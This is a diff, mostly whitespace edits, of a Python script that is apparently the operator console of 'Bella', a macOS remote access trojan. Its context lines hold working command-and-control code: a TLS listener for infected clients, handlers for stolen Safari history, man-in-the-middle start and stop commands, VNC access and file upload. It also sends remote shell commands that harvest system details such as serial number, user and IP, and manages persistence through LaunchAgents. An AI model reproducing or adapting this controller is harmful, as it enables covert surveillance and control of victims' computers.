@@ -1,7 +1,9 @@
 #!/usr/bin/env python
+
 # -*- coding: utf-8 -*-
 import socket, os, sys, select, time, bz2, random, platform, datetime, base64, pickle
 import re, urllib, json, subprocess, errno, struct, optparse, ssl
+
 try:
     import gnureadline
     macOS_rl = False
@@ -120,7 +122,7 @@ def recvall(sock, n, length):
             return None
         data += packet
     return pickle.loads(data) #convert the data back to normal
-          
+
 def tab_parser(text, exist):
     global file_list
     for File in file_list:
@@ -144,7 +146,7 @@ def progressbar(width, prefix, size):
     sys.stdout.write("\n")
     sys.stdout.flush()
 
-def main(): 
+def main():
     serverisRoot = False
     ctrlC = False
     active=False
@@ -158,22 +160,22 @@ def main():
     subprocess_list = []
     global file_list
     file_list = commands
-    computername = '' 
+    computername = ''
     activate = 0
     columns = row_set()
     if not os.path.isfile("%sserver.key" % helperpath):
         print '\033[91mGENERATING CERTIFICATES TO ENCRYPT THE SOCKET.\033[0m\n\n'
-        os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath)) 
+        os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath))
     clear()
     port = 4545
     print '%s%s%s%s' % (purple, bold, 'Listening for clients over port [%s]'.center(columns, ' ') % port, endC)
 
     sys.stdout.write(blue + bold)
     for i in progressbar(range(48), '\t     ', columns - 28):
-        time.sleep(0.05) 
+        time.sleep(0.05)
     sys.stdout.write(endC)
     colors = [blue, green, yellow]
-    random.shuffle(colors) 
+    random.shuffle(colors)
 
     binder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     binder.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -276,17 +278,17 @@ def main():
                     data = "\n"
                     ctrlC = False
                 else:
-                    (data, isFinished) = recv_msg(connections[activate]) 
+                    (data, isFinished) = recv_msg(connections[activate])
                     if not isFinished:
                         print data, #print it and continue
                         continue #just go back to top and keep receiving
                 nextcmd = ''
                 process_running = False
-                
+
                 if type(data) == type(None):
                     active=False
                     print "\n%s%sLost connection to server.%s" % (red, bold, endC)
-                    
+
                 if first_run == True:
                     is_server_rooted = False
                     if data == 'payload_request_SBJ129':
@@ -387,7 +389,7 @@ def main():
                     print "%sGot Safari History" % greenCheck
 
                 elif data.startswith('lserlser')==True:
-                    (rawfile_list, filePrint) = pickle.loads(data[8:]) 
+                    (rawfile_list, filePrint) = pickle.loads(data[8:])
                     widths = [max(map(len, col)) for col in zip(*filePrint)]
                     for fileItem in filePrint:
                         line = "  ".join((val.ljust(width) for val, width in zip(fileItem, widths))) #does pretty print
@@ -414,11 +416,11 @@ def main():
                         client_name_formatted = "%s%s@%s%s" % (red, client_name, computername, endC)
                     else:
                         client_name_formatted = "%s%s@%s%s" % (green, client_name, computername, endC)
-                    
+
                     if workingdir.startswith("/Users/" + client_name.lower()) or workingdir.startswith("/Users/" + client_name):
                         pathlen = 7 + len(client_name) #where 7 is our length of /Users/
                         workingdir = "~" + workingdir[pathlen:] #change working dir to ~[/users/name:restofpath] (in that range)
-                   
+
                     workingdirFormatted = blue + workingdir + endC
                     if macOS_rl:
                         readline.parse_and_bind("bind ^I rl_complete")
@@ -486,10 +488,10 @@ def main():
                         interface = raw_input("🎯  Specify an interface to stop MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                         nextcmd = "mitm_kill:::%s:::%s" % (interface, certsha)
 
-                    if nextcmd == "clear": 
+                    if nextcmd == "clear":
                         clear()
                         nextcmd = "printf ''"
-                        
+
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
@@ -537,12 +539,12 @@ def main():
                         nextcmd = ""
                         if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                             nextcmd = "shutdownserver_yes"
-                    
+
                     if nextcmd == "updateserver_yes":
                         if raw_input("Are you sure you want to update the server?: (Y/n) ").lower() == "y":
                             nextcmd = "updateserver_yes"
                         else:
-                            nextcmd = ""  
+                            nextcmd = ""
 
                     if nextcmd == "vnc":
                         vnc_port = 5500
@@ -553,10 +555,10 @@ def main():
                     if nextcmd == "volume":
                         vol_level = str(raw_input("Set volume to? (0[low]-7[high]) "))
                         nextcmd = "osascript -e \"Set Volume \"" + vol_level + ""
-                       
+
                     if nextcmd == "sysinfo":
                         nextcmd = 'scutil --get LocalHostName; whoami; pwd; echo "----------"; sw_vers; ioreg -l | awk \'/IOPlatformSerialNumber/ { print "SerialNumber: \t" $4;}\'; echo "----------";sysctl -n machdep.cpu.brand_string; hostinfo | grep memory; df -h / | grep dev | awk \'{ printf $3}\'; printf "/"; df -h / | grep dev | awk \'{ printf $2 }\'; echo " HDD space used"; echo "----------"; printf "Local IP: "; ipconfig getifaddr en0; ipconfig getifaddr en1; printf "Current Window: "; python -c \'from AppKit import NSWorkspace; print NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()\'; echo "----------"'
-                    
+
                     if nextcmd.startswith("upload"): #uploads to CWD.
                         if nextcmd == "upload":
                             local_file= raw_input("🌈  Enter full path to file on local machine: ")
